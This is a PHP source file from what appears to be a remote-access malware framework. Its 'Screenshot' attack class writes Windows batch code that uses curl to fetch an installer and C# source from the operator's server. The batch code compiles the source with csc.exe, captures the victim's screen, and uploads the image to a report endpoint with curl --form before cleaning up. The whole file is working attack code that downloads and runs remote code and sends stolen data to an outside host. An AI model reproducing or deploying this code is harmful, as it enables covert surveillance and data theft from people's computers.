<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;

/**
 * Class Screenshot. Takes a screenshot. This is done by downloading a C# script, compile it, then run it to get the screenshot. If the binary is already there then reuse that.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class Screenshot extends AttackBase {
    private static string $IMG_EXTENSION = "png";

    public function generateBatchCode(): void {
        //@formatter:off ?>
        @echo off
        if not exist "%~pd0..\..\utils\scst.exe" (
            >"%~pd0install.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/install\n"; ?>
            start /wait /b /d "%~pd0" install.cmd
            rem del install.cmd
        )
        "%~pd0..\..\utils\scst.exe" "%~pd0screen.<?php echo self::$IMG_EXTENSION; ?>"
        <?php echo Windows::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); ?>
        <?php echo Windows::cleanUpPayload(); ?>
        <?php //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "screenshot=@%~pd0screen.<?php echo self::$IMG_EXTENSION; ?>" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
        switch ($resourceIdentifier) {
            case "install": //@formatter:off ?>
@echo off
SetLocal

>"%~pd0code" curl -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/code\n"; ?>

:: find csc.exe
set "csc="
for /r "%SystemRoot%\Microsoft.NET\Framework\" %%# in ("*csc.exe") do  set "csc=%%#"

if not exist "%csc%" (
    echo no .net framework installed
    exit /b 10
)

if not exist "%~n0.exe" (
    call %csc% /nologo /r:"Microsoft.VisualBasic.dll" /out:"%~pd0scst.exe" "%~pd0code" || (
        exit /b %errorlevel%
    )
)
move "%~pd0scst.exe" "%~pd0..\..\utils\scst.exe"
                <?php break; //@formatter:on
            case "code":
                readfile(__DIR__ . "/resources/screenshot.cs");
                break;
            default:
        }
    }

    protected function setState(string $json): void {
    }

    protected function getState(): string {
        return json_encode([]);
    }

    public function setStaticUsage() {
        $this->usage->setDisk(1100000);
        $this->usage->saveState();
    }
}
